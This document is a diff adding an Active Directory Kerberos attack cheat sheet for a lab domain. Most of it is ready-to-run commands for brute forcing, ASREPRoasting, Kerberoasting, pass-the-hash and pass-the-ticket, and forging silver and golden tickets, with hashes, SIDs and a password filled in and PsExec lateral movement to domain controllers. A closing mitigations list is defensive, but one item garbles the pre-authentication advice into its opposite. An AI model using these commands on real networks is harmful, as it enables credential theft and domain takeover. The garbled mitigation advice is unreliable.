@@ -1,0 +1,72 @@
+Kerberos Attacks:
+
+1) Brute forcing accounts
+python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
+Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:jurassic.park /outfile:jurassic_passwords.txt
+
+2) ASREPRoast
+python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
++ Cracking the AS_REP
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
+john --wordlist=passwords_kerb.txt hashes.asreproast
+
+3) Kerberoasting
+python GetUserSPNs.py jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast
+Rubeus.exe kerberoast /outfile:hashes.kerberoast
++ Cracking the TGSs
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+
+4) Overpass The Hash/Pass The Key (PTK)
+python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+PsExec.exe -accepteula \\labwws02.jurassic.park cmd
+
+5) Pass The Ticket (PTT)
+ls -lah /tmp/krb5*
+sekurlsa::tickets /export
+Rubeus dump
++ Swaping Linux and Windows tickets between platforms
+python ticket_converter.py velociraptor.ccache velociraptor.kirbi
+python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+
+export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
+python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
+kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
+PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
+Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
+PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
+
+6) Silver ticket
+python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park  stegosaurus
+export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
+python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
+kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park
+PsExec.exe -accepteula \\labwws02.jurassic.park cmd
+
+7) Golden ticket
+python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
+export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
+python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
+kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:25b2076cda3bfd6209161a6c78a69c1c /user:stegosaurus
+Rubeus.exe ptt /ticket:ticket.kirbi
+PsExec.exe -accepteula \\lab-wdc02.jurassic.park cmd
+
+
+[Mitigations]
+
+In order to prevent or mitigate many of these Kerberos attacks a series of policies can be implemented. Some examples are the following:
+
+    Enable an strong password policy: First step is to avoid having weak passwords in domain user accounts. To achieve this an strong password policy should be implemented, by ensuring that complex password option is enabled on Active Directory domain. Moreover, blacklisting some common predictable terms in passwords as company names, year or months names.
+    Avoid accounts without pre-authentication: If it is no completely necessary, none account must have Kerberos pre-authentication enabled. In case that this cannot be avoided, take note of these special accounts and create pseudo-random passwords with high level of complexity.
+    Avoid executing services in behalf of account accounts: Avoid services that run in domain user account context. In case of using an special user account for launch domain services, generate an strong pseudo-random password for that account.
+    Verify PAC: Enable PAC verification in order to avoid attacks such as Silver Ticket. To enable this check set the value ValidateKdcPacSignature (DWORD) in subkey HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters to 1.
+    Change passwords periodically: Set policies to ensure that user passwords are periodically modified, for example, each 2 to 4 months. As special case, krbtgt account password should also be changed periodically, since that key is used to create TGTs. To this purpose, the script https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51 can be used. It must be taken into account that krbtgt password must be modified twice to invalidate current domain tickets, for cache reasons. Another consideration is that the functional level of domain must be equal or higher than Windows Server 2008 in order to manipulate krbtgt account credentials.
+    Disable Kerberos weak encryption types: Only Kerberos encryption with AES keys should be allowed. Furthermore, Kerberos requests with a lower level of encryption as RC4 should be monitored, due is usually used by attack tools.
+
+Additionally, Microsoft has published a guide which explains more detailed ways of preventing and mitigations this sort of attacks. It can be downloaded at https://www.microsoft.com/en-us/download/details.aspx?id=36036.
+
